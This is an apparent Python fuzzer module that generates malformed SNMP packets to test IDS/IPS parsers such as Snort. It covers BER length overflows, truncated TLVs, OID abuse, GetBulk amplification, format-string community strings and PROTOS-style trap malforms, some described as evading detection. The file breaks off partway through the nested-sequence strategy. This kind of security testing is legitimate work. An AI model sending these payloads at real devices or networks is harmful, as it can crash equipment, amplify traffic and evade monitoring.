import random
import struct

# ---------------------------------------------------------------------------
# SNMP mutation strategies for IDS/IPS fault & vulnerability testing.
#
# Grounded in:
#   - RFC 1157  (SNMPv1 message + PDUs)
#   - RFC 1901  (SNMPv2c community wrapper, version=1)
#   - RFC 3416  (SNMPv2 PDU operations: GetBulk/Inform/v2-Trap/Report)
#   - RFC 3417  (UDP/IPv4 transport + BER serialization; NON-MINIMAL length
#                encoding is explicitly permitted -> a huge parser surface)
#   - RFC 3412  (SNMPv3 message: HeaderData, msgFlags, ScopedPDU)
#   - RFC 3414  (USM security parameters; msgUserName SIZE(0..32))
#   - RFC 3411  (snmpEngineID SIZE(5..32), format byte)
#   - RFC 5343  (engineID discovery via empty msgAuthoritativeEngineID)
#
# Snort detection model: Snort 3 has NO dedicated stateful SNMP inspector.
# SNMP is caught by TEXT RULES (gid 1, protocol-snmp.rules: community
# "public"/"private" sid 1407-1410, request/trap udp 161/162 sid 1417-1420,
# AgentX, broadcast) plus the BER/ASN.1 decoding any detection performs. The
# canonical fuzz corpus is the PROTOS c06-SNMPv1 suite (CERT CA-2002-03,
# CVE-2002-0012 trap handling, CVE-2002-0013 request handling) which broke
# dozens of SNMP stacks via malformed BER.
#
# Every payload is a RAW UDP payload (no IP/UDP framing -- the transport layer
# adds that).  build_snmp_payload() returns (payload, dst_port): 161 for
# requests, 162 for traps.  Each payload begins with a structurally valid
# outer SEQUENCE (0x30) + version + community so Snort's fast-pattern matcher
# binds the flow as SNMP BEFORE hitting the malicious bytes.
# ---------------------------------------------------------------------------

SNMP_STRATEGIES = [
    "ber_length_overflow",
    "ber_indefinite_nonminimal",
    "truncated_tlv",
    "version_pdu_confusion",
    "getbulk_amplification",
    "oid_encoding_attack",
    "varbind_bomb",
    "trap_v1_malform",
    "integer_field_overflow",
    "community_overflow",
    "nested_sequence_bomb",
    "v3_header_malform",
    "usm_param_overflow",
    "engineid_scopedpdu_abuse",
]

SNMP_WEIGHTS = [14, 6, 10, 5, 10, 12, 8, 12, 8, 6, 5, 6, 8, 4]

SNMP_STRATEGY_LABELS = {
    "ber_length_overflow":        "BER Length Overflow",
    "ber_indefinite_nonminimal":  "BER Indefinite / Non-Minimal Length",
    "truncated_tlv":              "Truncated TLV",
    "version_pdu_confusion":      "Version / PDU Confusion",
    "getbulk_amplification":      "GetBulk Amplification",
    "oid_encoding_attack":        "OID Encoding Attack",
    "varbind_bomb":               "VarBind Bomb",
    "trap_v1_malform":            "v1 Trap Malform (PROTOS c06)",
    "integer_field_overflow":     "Integer Field Overflow",
    "community_overflow":         "Community Overflow",
    "nested_sequence_bomb":       "Nested SEQUENCE Bomb",
    "v3_header_malform":          "SNMPv3 Header Malform",
    "usm_param_overflow":         "USM Parameter Overflow",
    "engineid_scopedpdu_abuse":   "EngineID / ScopedPDU Abuse",
}

# Keep payloads inside a single UDP datagram (IPv4: 65535 - 20 IP - 8 UDP).
_MAX_UDP = 65000

# ── BER / ASN.1 primitives ─────────────────────────────────────────────────
# Universal tags
_T_INTEGER = 0x02
_T_OCTET_STRING = 0x04
_T_NULL = 0x05
_T_OID = 0x06
_T_SEQUENCE = 0x30
# Application types (ObjectSyntax, RFC 3416)
_T_IPADDRESS = 0x40
_T_COUNTER32 = 0x41
_T_GAUGE32 = 0x42
_T_TIMETICKS = 0x43
_T_OPAQUE = 0x44
_T_COUNTER64 = 0x46
# Context PDU tags (constructed)
_PDU_GET = 0xA0
_PDU_GETNEXT = 0xA1
_PDU_RESPONSE = 0xA2
_PDU_SET = 0xA3
_PDU_TRAP_V1 = 0xA4
_PDU_GETBULK = 0xA5
_PDU_INFORM = 0xA6
_PDU_TRAP_V2 = 0xA7
_PDU_REPORT = 0xA8


def _ber_len(n: int) -> bytes:
    """Minimal definite-form BER length."""
    if n < 0x80:
        return bytes([n])
    out = b""
    v = n
    while v > 0:
        out = bytes([v & 0xFF]) + out
        v >>= 8
    return bytes([0x80 | len(out)]) + out


def _ber_len_long(n: int, octets: int) -> bytes:
    """Force a long-form length with exactly `octets` value bytes (non-minimal
    encoding -- legal per RFC 3417, used to desync parsers)."""
    octets = max(1, min(octets, 0x7E))
    body = n.to_bytes(octets, "big", signed=False) if n < (1 << (8 * octets)) else (b"\xFF" * octets)
    return bytes([0x80 | octets]) + body


def _tlv(tag: int, value: bytes) -> bytes:
    return bytes([tag]) + _ber_len(len(value)) + value


def _integer(value: int) -> bytes:
    """Proper minimal two's-complement INTEGER."""
    if value == 0:
        body = b"\x00"
    else:
        length = (value.bit_length() + 8) // 8 if value > 0 else (((-value - 1).bit_length() + 8) // 8)
        body = value.to_bytes(length, "big", signed=True)
        # strip redundant leading bytes while preserving sign
        while len(body) > 1 and ((body[0] == 0x00 and not (body[1] & 0x80)) or
                                 (body[0] == 0xFF and (body[1] & 0x80))):
            body = body[1:]
    return _tlv(_T_INTEGER, body)


def _raw_integer(body: bytes) -> bytes:
    """INTEGER with an arbitrary (possibly illegal) value field."""
    return _tlv(_T_INTEGER, body)


def _octet_string(data: bytes) -> bytes:
    return _tlv(_T_OCTET_STRING, data)


def _null() -> bytes:
    return bytes([_T_NULL, 0x00])


def _oid(parts) -> bytes:
    """Encode an OID from a list of integer sub-identifiers."""
    if len(parts) < 2:
        parts = list(parts) + [0] * (2 - len(parts))
    first = 40 * parts[0] + parts[1]
    body = bytearray([first])
    for sub in parts[2:]:
        body += _base128(sub)
    return _tlv(_T_OID, bytes(body))


def _base128(value: int, pad: int = 0) -> bytes:
    """Multi-byte base-128 sub-identifier. `pad` adds leading 0x80 continuation
    bytes (overlong / non-minimal encoding)."""
    if value == 0:
        out = bytearray([0])
    else:
        out = bytearray()
        v = value
        while v > 0:
            out.insert(0, v & 0x7F)
            v >>= 7
    for i in range(len(out) - 1):
        out[i] |= 0x80
    return (b"\x80" * pad) + bytes(out)


def _sequence(content: bytes) -> bytes:
    return _tlv(_T_SEQUENCE, content)


def _ctx(tag: int, content: bytes) -> bytes:
    return _tlv(tag, content)


# Common well-known OIDs
_OID_SYSDESCR = [1, 3, 6, 1, 2, 1, 1, 1, 0]
_OID_SYSOBJECTID = [1, 3, 6, 1, 2, 1, 1, 2, 0]
_OID_SYSUPTIME = [1, 3, 6, 1, 2, 1, 1, 3, 0]
_OID_ENTERPRISE = [1, 3, 6, 1, 4, 1, 9]
_OID_SNMPTRAP = [1, 3, 6, 1, 6, 3, 1, 1, 4, 1, 0]
_OID_SNMPENGINEID = [1, 3, 6, 1, 6, 3, 10, 2, 1, 1, 0]


def _rid() -> int:
    return random.randint(1, 0x7FFFFFFF)


def _varbind(oid_parts, value: bytes = None) -> bytes:
    if value is None:
        value = _null()
    return _sequence(_oid(oid_parts) + value)


def _varbindlist(varbinds) -> bytes:
    return _sequence(b"".join(varbinds))


def _std_pdu(pdu_tag: int, varbinds: bytes, request_id: int = None,
             error_status: int = 0, error_index: int = 0) -> bytes:
    """Standard PDU: request-id, error-status, error-index, varbinds."""
    if request_id is None:
        request_id = _rid()
    return _ctx(pdu_tag, _integer(request_id) + _integer(error_status) +
                _integer(error_index) + varbinds)


def _message_v1v2c(version: int, community: bytes, pdu: bytes) -> bytes:
    """SNMPv1 (version=0) / SNMPv2c (version=1) message wrapper."""
    return _sequence(_integer(version) + _octet_string(community) + pdu)


def _clamp(payload: bytes) -> bytes:
    return payload[:_MAX_UDP]


# ── Strategy 1: BER length-field integer overflow ───────────────────────────
def _build_ber_length_overflow():
    """Long-form BER length declaring far more bytes than present, length>buffer
    at various nesting levels, 5-octet length, length that wraps when added to
    the read offset. Targets the length-parsing arithmetic (heap alloc / OOB)."""
    variant = random.choice([
        "outer_4gb", "octet_huge", "integer_huge", "five_octet_len",
        "len_gt_remaining", "varbind_len_lie", "pdu_len_lie", "wrap_offset",
    ])
    community = b"public"
    if variant == "outer_4gb":
        # Outer SEQUENCE claims 0xFFFFFFFF bytes but only carries a tiny body.
        body = _integer(1) + _octet_string(community) + _std_pdu(_PDU_GET, _varbindlist([_varbind(_OID_SYSDESCR)]))
        return bytes([_T_SEQUENCE]) + _ber_len_long(0xFFFFFFFF, 4) + body, 161
    if variant == "octet_huge":
        # community OCTET STRING declares 2GB length, supplies 4 bytes.
        pdu = _std_pdu(_PDU_GET, _varbindlist([_varbind(_OID_SYSDESCR)]))
        evil = bytes([_T_OCTET_STRING]) + _ber_len_long(0x7FFFFFFF, 4) + b"pub"
        return _sequence(_integer(1) + evil + pdu), 161
    if variant == "integer_huge":
        # request-id INTEGER claims huge length.
        evil_int = bytes([_T_INTEGER]) + _ber_len_long(0x10000000, 4) + b"\x01"
        pdu = _ctx(_PDU_GET, evil_int + _integer(0) + _integer(0) +
                   _varbindlist([_varbind(_OID_SYSDESCR)]))
        return _message_v1v2c(1, community, pdu), 161
    if variant == "five_octet_len":
        # 0x85 = 5 length octets (illegal: max defined is 0x84). Parser may
        # read 5 bytes as the length -> 40-bit length.
        pdu = _std_pdu(_PDU_GET, _varbindlist([_varbind(_OID_SYSDESCR)]))
        body = _integer(1) + _octet_string(community) + pdu
        return bytes([_T_SEQUENCE, 0x85]) + b"\xFF\xFF\xFF\xFF\xFF" + body, 161
    if variant == "len_gt_remaining":
        vb = _varbindlist([_varbind(_OID_SYSDESCR)])
        evil_pdu = bytes([_PDU_GET]) + _ber_len(len(vb) + 5000) + _integer(_rid()) + _integer(0) + _integer(0) + vb
        return _message_v1v2c(0, community, evil_pdu), 161
    if variant == "varbind_len_lie":
        inner = _oid(_OID_SYSDESCR) + _null()
        evil_vb = bytes([_T_SEQUENCE]) + _ber_len(len(inner) + 4096) + inner
        vbl = _sequence(evil_vb)
        return _message_v1v2c(1, community, _std_pdu(_PDU_GET, vbl)), 161
    if variant == "pdu_len_lie":
        vb = _varbindlist([_varbind(_OID_SYSDESCR)])
        inner = _integer(_rid()) + _integer(0) + _integer(0) + vb
        evil = bytes([_PDU_GETNEXT]) + _ber_len_long(len(inner), 3) + inner  # non-minimal pdu length
        return _message_v1v2c(1, community, evil), 161
    # wrap_offset: length near SIZE_MAX so offset+len wraps
    pdu = _std_pdu(_PDU_GET, _varbindlist([_varbind(_OID_SYSDESCR)]))
    evil = bytes([_T_OCTET_STRING]) + _ber_len_long(0xFFFFFFFFFFFFFFF0, 8) + b"x"
    return _sequence(_integer(1) + evil + pdu), 161


# ── Strategy 2: indefinite + non-minimal length encoding ────────────────────
def _build_ber_indefinite_nonminimal(payload_override=None):
    """Indefinite length form (0x80, ambiguous for SNMP) and redundant/
    non-minimal length octets. Snort and the target may disagree on field
    boundaries -> evasion / desync."""
    if payload_override is not None:
        vb = _varbindlist([_varbind(_OID_SYSDESCR)])
        pdu = _std_pdu(_PDU_GET, vb)
        evil_comm = bytes([_T_OCTET_STRING, 0x80]) + payload_override + b"\x00\x00"
        body = _integer(1) + evil_comm + pdu
        return bytes([_T_SEQUENCE, 0x80]) + body + b"\x00\x00", 161
    variant = random.choice([
        "indefinite_outer", "indefinite_octet", "nonmin_1", "nonmin_pad_zero",
        "nonmin_all", "mixed",
    ])
    community = b"public"
    vb = _varbindlist([_varbind(_OID_SYSDESCR)])
    pdu = _std_pdu(_PDU_GET, vb)
    if variant == "indefinite_outer":
        body = _integer(1) + _octet_string(community) + pdu
        # 0x80 indefinite + body + EOC (00 00)
        return bytes([_T_SEQUENCE, 0x80]) + body + b"\x00\x00", 161
    if variant == "indefinite_octet":
        evil = bytes([_T_OCTET_STRING, 0x80]) + community + b"\x00\x00"
        return _sequence(_integer(1) + evil + pdu), 161
    if variant == "nonmin_1":
        # community length 6 encoded as 0x81 0x06 (long form where short suffices)
        evil = bytes([_T_OCTET_STRING]) + _ber_len_long(len(community), 1) + community
        return _sequence(_integer(1) + evil + pdu), 161
    if variant == "nonmin_pad_zero":
        # length with leading zero octets: 0x83 00 00 06
        evil = bytes([_T_OCTET_STRING, 0x83, 0x00, 0x00, len(community)]) + community
        return _sequence(_integer(1) + evil + pdu), 161
    if variant == "nonmin_all":
        # every length non-minimal (4-octet long form everywhere)
        comm = bytes([_T_OCTET_STRING]) + _ber_len_long(len(community), 4) + community
        ver = bytes([_T_INTEGER]) + _ber_len_long(1, 4) + b"\x01"
        body = ver + comm + pdu
        return bytes([_T_SEQUENCE]) + _ber_len_long(len(body), 4) + body, 161
    # mixed indefinite + non-minimal
    evil_comm = bytes([_T_OCTET_STRING]) + _ber_len_long(len(community), 2) + community
    body = _integer(1) + evil_comm + pdu
    return bytes([_T_SEQUENCE, 0x80]) + body + b"\x00\x00", 161


# ── Strategy 3: truncated TLV (OOB read past packet end) ────────────────────
def _build_truncated_tlv():
    """Declared length exceeds the bytes actually present, at every level."""
    variant = random.choice([
        "outer", "community", "pdu", "varbind_seq", "oid", "integer", "missing_value",
    ])
    community = b"public"
    if variant == "outer":
        full = _message_v1v2c(1, community, _std_pdu(_PDU_GET, _varbindlist([_varbind(_OID_SYSDESCR)])))
        # keep header (tag+len) but cut the body in half
        cut = len(full) // 2
        return full[:cut], 161
    if variant == "community":
        # community claims 200 bytes, supplies 3
        evil = bytes([_T_OCTET_STRING, 200]) + b"pub"
        return bytes([_T_SEQUENCE, 0x30]) + _integer(1) + evil, 161
    if variant == "pdu":
        evil_pdu = bytes([_PDU_GET, 0x7F])  # declares 127 bytes, none follow
        return _message_v1v2c(1, community, evil_pdu), 161
    if variant == "varbind_seq":
        vbl = bytes([_T_SEQUENCE, 0x40]) + _oid(_OID_SYSDESCR)  # seq too short
        pdu = _std_pdu(_PDU_GET, vbl)
        return _message_v1v2c(1, community, pdu), 161
    if variant == "oid":
        evil_oid = bytes([_T_OID, 0x20, 0x2B, 0x06])  # claims 32, gives 2
        vb = _sequence(evil_oid + _null())
        pdu = _std_pdu(_PDU_GET, _sequence(vb))
        return _message_v1v2c(1, community, pdu), 161
    if variant == "integer":
        evil_int = bytes([_T_INTEGER, 0x08, 0x01, 0x02])  # claims 8, gives 2
        pdu = _ctx(_PDU_GET, evil_int)
        return _message_v1v2c(1, community, pdu), 161
    # missing_value: OID then no value, varbind seq ends early
    vb = bytes([_T_SEQUENCE, 0x0F]) + _oid(_OID_SYSDESCR)
    pdu = _std_pdu(_PDU_GET, _sequence(vb))
    return _message_v1v2c(1, community, pdu), 161


# ── Strategy 4: version / PDU-type confusion ────────────────────────────────
def _build_version_pdu_confusion():
    """version INTEGER abuse + version/PDU mismatch (downgrade & state confusion)."""
    variant = random.choice([
        "negative", "huge", "zero_len", "v1_with_getbulk", "v3_with_community",
        "unknown_version", "padded_version",
    ])
    community = b"public"
    vb = _varbindlist([_varbind(_OID_SYSDESCR)])
    if variant == "negative":
        pdu = _std_pdu(_PDU_GET, vb)
        return _sequence(_raw_integer(b"\xFF") + _octet_string(community) + pdu), 161  # version = -1
    if variant == "huge":
        pdu = _std_pdu(_PDU_GET, vb)
        return _sequence(_raw_integer(b"\x7F\xFF\xFF\xFF\xFF\xFF\xFF\xFF") + _octet_string(community) + pdu), 161
    if variant == "zero_len":
        # 0-length INTEGER for version (illegal per BER)
        pdu = _std_pdu(_PDU_GET, vb)
        return _sequence(bytes([_T_INTEGER, 0x00]) + _octet_string(community) + pdu), 161
    if variant == "v1_with_getbulk":
        # GetBulk is SNMPv2-only but declared as v1 (version=0)
        bulk = _ctx(_PDU_GETBULK, _integer(_rid()) + _integer(0) + _integer(10) + vb)
        return _message_v1v2c(0, community, bulk), 161
    if variant == "v3_with_community":
        # msgVersion=3 but a v1-style community wrapper body follows
        pdu = _std_pdu(_PDU_GET, vb)
        return _sequence(_integer(3) + _octet_string(community) + pdu), 161
    if variant == "unknown_version":
        pdu = _std_pdu(_PDU_GET, vb)
        return _message_v1v2c(99, community, pdu), 161
    # padded_version: non-minimal version integer 0x00 0x00 0x01
    pdu = _std_pdu(_PDU_GET, vb)
    return _sequence(_raw_integer(b"\x00\x00\x01") + _octet_string(community) + pdu), 161


# ── Strategy 5: GetBulk amplification / resource exhaustion ─────────────────
def _build_getbulk_amplification():
    """GetBulkRequest with extreme non-repeaters / max-repetitions to force the
    agent to generate an enormous response (amplification DoS, RFC 3416
    max-bindings=2147483647)."""
    variant = random.choice([
        "max_reps", "max_both", "negative_nonrep", "many_oids", "mismatch", "huge_reps_int",
    ])
    community = b"public"
    base_vbs = [_varbind(_OID_SYSDESCR), _varbind(_OID_SYSUPTIME)]
    if variant == "max_reps":
        bulk = _ctx(_PDU_GETBULK, _integer(_rid()) + _integer(0) +
                    _integer(0x7FFFFFFF) + _varbindlist(base_vbs))
        return _message_v1v2c(1, community, bulk), 161
    if variant == "max_both":
        bulk = _ctx(_PDU_GETBULK, _integer(_rid()) + _integer(0x7FFFFFFF) +
                    _integer(0x7FFFFFFF) + _varbindlist(base_vbs))
        return _message_v1v2c(1, community, bulk), 161
    if variant == "negative_nonrep":
        bulk = _ctx(_PDU_GETBULK, _integer(_rid()) + _raw_integer(b"\xFF\xFF") +
                    _integer(0x7FFFFFFF) + _varbindlist(base_vbs))
        return _message_v1v2c(1, community, bulk), 161
    if variant == "many_oids":
        vbs = [_varbind([1, 3, 6, 1, 2, 1, i % 50 + 1]) for i in range(400)]
        bulk = _ctx(_PDU_GETBULK, _integer(_rid()) + _integer(0) +
                    _integer(0x7FFFFFFF) + _varbindlist(vbs))
        return _clamp(_message_v1v2c(1, community, bulk)), 161
    if variant == "mismatch":
        # non-repeaters greater than the number of varbinds
        bulk = _ctx(_PDU_GETBULK, _integer(_rid()) + _integer(9999) +
                    _integer(0x7FFFFFFF) + _varbindlist(base_vbs))
        return _message_v1v2c(1, community, bulk), 161
    # huge_reps_int: max-repetitions as oversized 9-byte integer
    bulk = _ctx(_PDU_GETBULK, _integer(_rid()) + _integer(0) +
                _raw_integer(b"\x7F\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF") + _varbindlist(base_vbs))
    return _message_v1v2c(1, community, bulk), 161


# ── Strategy 6: OID encoding attack ─────────────────────────────────────────
def _build_oid_encoding_attack():
    """OID parser abuse: too many sub-ids, sub-id > 2^32-1, overlong base-128,
    unterminated sub-id, empty OID (RFC 3416: max 128 sub-ids, each < 2^32)."""
    variant = random.choice([
        "too_many_subids", "subid_over_32bit", "overlong_pad", "unterminated",
        "empty_oid", "giant_subid", "huge_first_byte",
    ])
    community = b"public"
    if variant == "too_many_subids":
        parts = [1, 3] + [random.randint(1, 9) for _ in range(300)]  # 302 sub-ids > 128
        vb = _sequence(_oid(parts) + _null())
        return _clamp(_message_v1v2c(1, community, _std_pdu(_PDU_GET, _sequence(vb)))), 161
    if variant == "subid_over_32bit":
        # sub-id encoded as 0xFFFFFFFFF (40 bits) -> > 2^32-1
        body = bytearray([0x2B])  # 1.3
        body += bytes([0x8F, 0xFF, 0xFF, 0xFF, 0x7F])  # ~ 5-byte sub-id
        evil_oid = _tlv(_T_OID, bytes(body))
        vb = _sequence(evil_oid + _null())
        return _message_v1v2c(1, community, _std_pdu(_PDU_GET, _sequence(vb))), 161
    if variant == "overlong_pad":
        # sub-id with leading 0x80 continuation bytes (non-minimal)
        body = bytearray([0x2B])
        body += _base128(1, pad=8)  # 8 padding continuation bytes then '1'
        evil_oid = _tlv(_T_OID, bytes(body))
        vb = _sequence(evil_oid + _null())
        return _message_v1v2c(1, community, _std_pdu(_PDU_GET, _sequence(vb))), 161
    if variant == "unterminated":
        # last sub-id byte has continuation bit set (never terminates)
        body = bytes([0x2B, 0x06, 0x81, 0x81, 0x81])  # trailing high-bit bytes
        evil_oid = _tlv(_T_OID, body)
        vb = _sequence(evil_oid + _null())
        return _message_v1v2c(1, community, _std_pdu(_PDU_GET, _sequence(vb))), 161
    if variant == "empty_oid":
        evil_oid = bytes([_T_OID, 0x00])
        vb = _sequence(evil_oid + _null())
        return _message_v1v2c(1, community, _std_pdu(_PDU_GET, _sequence(vb))), 161
    if variant == "giant_subid":
        body = bytearray([0x2B])
        body += _base128(0xFFFFFFFF)
        body += _base128(0xFFFFFFFF)
        evil_oid = _tlv(_T_OID, bytes(body))
        vb = _sequence(evil_oid + _null())
        return _message_v1v2c(1, community, _std_pdu(_PDU_GET, _sequence(vb))), 161
    # huge_first_byte: first byte 0xFF (encodes 6.15, invalid arc)
    evil_oid = _tlv(_T_OID, bytes([0xFF, 0x06, 0x01]))
    vb = _sequence(evil_oid + _null())
    return _message_v1v2c(1, community, _std_pdu(_PDU_GET, _sequence(vb))), 161


# ── Strategy 7: VarBind bomb (flood / type confusion) ───────────────────────
def _build_varbind_bomb():
    """VarBindList abuse: thousands of varbinds, exception tags in requests,
    type-confused values, oversized OCTET STRING values."""
    variant = random.choice([
        "flood", "exception_in_request", "type_confusion", "giant_value",
        "empty_varbinds", "deep_value_nest",
    ])
    community = b"public"
    if variant == "flood":
        vbs = [_varbind([1, 3, 6, 1, 2, 1, 1, (i % 9) + 1, 0]) for i in range(2000)]
        return _clamp(_message_v1v2c(1, community, _std_pdu(_PDU_GET, _varbindlist(vbs)))), 161
    if variant == "exception_in_request":
        # noSuchObject [0]/noSuchInstance [1]/endOfMibView [2] are response-only
        vbs = [
            _sequence(_oid(_OID_SYSDESCR) + bytes([0x80, 0x00])),   # noSuchObject
            _sequence(_oid(_OID_SYSUPTIME) + bytes([0x81, 0x00])),  # noSuchInstance
            _sequence(_oid(_OID_SYSOBJECTID) + bytes([0x82, 0x00])),  # endOfMibView
        ]
        return _message_v1v2c(1, community, _std_pdu(_PDU_GET, _varbindlist(vbs))), 161
    if variant == "type_confusion":
        # value is a nested PDU / OID where a scalar is expected
        vbs = [
            _sequence(_oid(_OID_SYSDESCR) + _ctx(_PDU_GET, _integer(1))),
            _sequence(_oid(_OID_SYSUPTIME) + _oid([1, 3, 6, 1])),
            _sequence(_oid(_OID_SYSOBJECTID) + _tlv(_T_COUNTER64, b"\x7F" * 12)),
        ]
        return _message_v1v2c(1, community, _std_pdu(_PDU_SET, _varbindlist(vbs))), 161
    if variant == "giant_value":
        big = _octet_string(bytes(random.choices(range(256), k=40000)))
        vb = _sequence(_oid(_OID_SYSDESCR) + big)
        return _clamp(_message_v1v2c(1, community, _std_pdu(_PDU_SET, _sequence(vb)))), 161
    if variant == "empty_varbinds":
        # zero-length varbind SEQUENCEs
        vbs = [bytes([_T_SEQUENCE, 0x00]) for _ in range(50)]
        return _message_v1v2c(1, community, _std_pdu(_PDU_GET, _varbindlist(vbs))), 161
    # deep_value_nest: value is deeply nested octet strings
    val = _octet_string(b"x")
    for _ in range(40):
        val = _octet_string(val)
    vb = _sequence(_oid(_OID_SYSDESCR) + val)
    return _message_v1v2c(1, community, _std_pdu(_PDU_SET, _sequence(vb))), 161


# ── Strategy 8: v1 Trap malform (PROTOS c06 / CVE-2002-0012) ────────────────
def _build_trap_v1_malform():
    """SNMPv1 Trap-PDU [0xA4] torture -- the historically broken parser.
    Trap-PDU = enterprise OID, agent-addr IpAddress(4), generic-trap(0..6),
    specific-trap, time-stamp TimeTicks, varbinds.  Sent to UDP 162."""
    variant = random.choice([
        "agent_addr_len", "generic_trap_oob", "enterprise_malformed",
        "spec_trap_huge", "timestamp_overflow", "missing_fields",
        "oversized_varbinds", "protos_classic",
    ])
    community = b"public"
    ent = _oid(_OID_ENTERPRISE)
    agent = _tlv(_T_IPADDRESS, bytes([10, 0, 0, 1]))
    if variant == "agent_addr_len":
        # IpAddress must be 4 bytes; give 16 (or 0)
        bad_agent = _tlv(_T_IPADDRESS, bytes(random.choice([0, 16, 1])))
        trap = _ctx(_PDU_TRAP_V1, ent + bad_agent + _integer(6) + _integer(1) +
                    _tlv(_T_TIMETICKS, b"\x00\x00\x00\x01") + _varbindlist([_varbind(_OID_SYSDESCR)]))
        return _message_v1v2c(0, community, trap), 162
    if variant == "generic_trap_oob":
        # generic-trap defined 0..6; send huge / negative
        gt = random.choice([_raw_integer(b"\x7F\xFF\xFF\xFF"), _raw_integer(b"\xFF"), _integer(255)])
        trap = _ctx(_PDU_TRAP_V1, ent + agent + gt + _integer(0) +
                    _tlv(_T_TIMETICKS, b"\x00\x00\x00\x01") + _varbindlist([_varbind(_OID_SYSDESCR)]))
        return _message_v1v2c(0, community, trap), 162
    if variant == "enterprise_malformed":
        bad_ent = bytes([_T_OID, 0x7F]) + b"\x2B"  # claims 127-byte OID
        trap = _ctx(_PDU_TRAP_V1, bad_ent + agent + _integer(6) + _integer(1) +
                    _tlv(_T_TIMETICKS, b"\x00\x00\x00\x01") + _varbindlist([_varbind(_OID_SYSDESCR)]))
        return _message_v1v2c(0, community, trap), 162
    if variant == "spec_trap_huge":
        st = _raw_integer(b"\x7F\xFF\xFF\xFF\xFF\xFF\xFF\xFF")
        trap = _ctx(_PDU_TRAP_V1, ent + agent + _integer(6) + st +
                    _tlv(_T_TIMETICKS, b"\x00\x00\x00\x01") + _varbindlist([_varbind(_OID_SYSDESCR)]))
        return _message_v1v2c(0, community, trap), 162
    if variant == "timestamp_overflow":
        ts = _tlv(_T_TIMETICKS, b"\xFF\xFF\xFF\xFF\xFF\xFF")  # >32-bit TimeTicks
        trap = _ctx(_PDU_TRAP_V1, ent + agent + _integer(2) + _integer(0) + ts +
                    _varbindlist([_varbind(_OID_SYSDESCR)]))
        return _message_v1v2c(0, community, trap), 162
    if variant == "missing_fields":
        # Trap-PDU missing agent-addr / generic-trap entirely
        trap = _ctx(_PDU_TRAP_V1, ent + _integer(6) + _varbindlist([_varbind(_OID_SYSDESCR)]))
        return _message_v1v2c(0, community, trap), 162
    if variant == "oversized_varbinds":
        vbs = [_varbind(_OID_SYSDESCR, _octet_string(b"A" * 1000)) for _ in range(30)]
        trap = _ctx(_PDU_TRAP_V1, ent + agent + _integer(6) + _integer(1) +
                    _tlv(_T_TIMETICKS, b"\x00\x00\x00\x01") + _varbindlist(vbs))
        return _clamp(_message_v1v2c(0, community, trap)), 162
    # protos_classic: enterpriseSpecific trap with empty/odd fields (c06 style)
    trap = _ctx(_PDU_TRAP_V1, _tlv(_T_OID, b"") + _tlv(_T_IPADDRESS, b"") +
                _integer(6) + _integer(0) + _tlv(_T_TIMETICKS, b"") +
                _varbindlist([_varbind(_OID_SYSDESCR, _octet_string(b""))]))
    return _message_v1v2c(0, community, trap), 162


# ── Strategy 9: INTEGER field overflow ──────────────────────────────────────
def _build_integer_field_overflow():
    """INTEGER encoding abuse across request-id/error-status/error-index and the
    application integer types (Counter32/64, Gauge32, TimeTicks)."""
    variant = random.choice([
        "rid_9byte", "zero_len_int", "errstatus_oob", "counter64_overflow",
        "negative_padding", "nonmin_int", "errindex_huge",
    ])
    community = b"public"
    vb = _varbindlist([_varbind(_OID_SYSDESCR)])
    if variant == "rid_9byte":
        pdu = _ctx(_PDU_GET, _raw_integer(b"\x7F" + b"\xFF" * 8) + _integer(0) + _integer(0) + vb)
        return _message_v1v2c(1, community, pdu), 161
    if variant == "zero_len_int":
        pdu = _ctx(_PDU_GET, bytes([_T_INTEGER, 0x00]) + _integer(0) + _integer(0) + vb)
        return _message_v1v2c(1, community, pdu), 161
    if variant == "errstatus_oob":
        # error-status defined 0..18; send 0xFFFF
        pdu = _ctx(_PDU_RESPONSE, _integer(_rid()) + _raw_integer(b"\xFF\xFF") + _integer(0) + vb)
        return _message_v1v2c(1, community, pdu), 161
    if variant == "counter64_overflow":
        vbn = _sequence(_oid(_OID_SYSUPTIME) + _tlv(_T_COUNTER64, b"\xFF" * 10))  # > 64 bits
        pdu = _std_pdu(_PDU_SET, _sequence(vbn))
        return _message_v1v2c(1, community, pdu), 161
    if variant == "negative_padding":
        pdu = _ctx(_PDU_GET, _raw_integer(b"\xFF\xFF\xFF\x01") + _integer(0) + _integer(0) + vb)
        return _message_v1v2c(1, community, pdu), 161
    if variant == "nonmin_int":
        # request-id with redundant leading 0x00 bytes
        pdu = _ctx(_PDU_GET, _raw_integer(b"\x00\x00\x00\x00\x2A") + _integer(0) + _integer(0) + vb)
        return _message_v1v2c(1, community, pdu), 161
    # errindex_huge
    pdu = _ctx(_PDU_RESPONSE, _integer(_rid()) + _integer(5) + _raw_integer(b"\x7F\xFF\xFF\xFF\xFF") + vb)
    return _message_v1v2c(1, community, pdu), 161


# ── Strategy 10: community string overflow / rule evasion ───────────────────
def _build_community_overflow():
    """community OCTET STRING abuse: oversized, NULs, format strings, the
    rule-tripping 'public'/'private', length lies."""
    variant = random.choice([
        "oversized", "embedded_nul", "format_string", "public_private",
        "zero_len", "binary", "length_lie",
    ])
    vb = _varbindlist([_varbind(_OID_SYSDESCR)])
    pdu = _std_pdu(_PDU_GET, vb)
    if variant == "oversized":
        comm = bytes(random.choices(range(33, 127), k=40000))
        return _clamp(_sequence(_integer(1) + _octet_string(comm) + pdu)), 161
    if variant == "embedded_nul":
        comm = b"pub\x00lic\x00\x00admin\x00"
        return _sequence(_integer(1) + _octet_string(comm) + pdu), 161
    if variant == "format_string":
        comm = (b"%n%n%n%s%s%x%x" * 8)
        return _sequence(_integer(1) + _octet_string(comm) + pdu), 161
    if variant == "public_private":
        comm = random.choice([b"public", b"private", b"PUBLIC", b"public" + b"\x00" * 4])
        return _sequence(_integer(0) + _octet_string(comm) + pdu), 161
    if variant == "zero_len":
        return _sequence(_integer(1) + bytes([_T_OCTET_STRING, 0x00]) + pdu), 161
    if variant == "binary":
        comm = bytes(random.choices(range(256), k=64))
        return _sequence(_integer(1) + _octet_string(comm) + pdu), 161
    # length_lie: community length declares 8 but supplies 64KB or vice versa
    evil = bytes([_T_OCTET_STRING, 0x04]) + b"publicEXTRA_BYTES_BEYOND_DECLARED_LENGTH"
    return _sequence(_integer(1) + evil + pdu), 161


# ── Strategy 11: nested SEQUENCE bomb (stack/recursion exhaustion) ──────────
def _build_nested_sequence_bomb():
    """Deeply nested SEQUENCEs to exhaust recursive-descent BER parsers."""
    variant = random.choice(["deep_seq", "deep_varbind", "alternating", "wide_then_deep"])
    community = b"public"
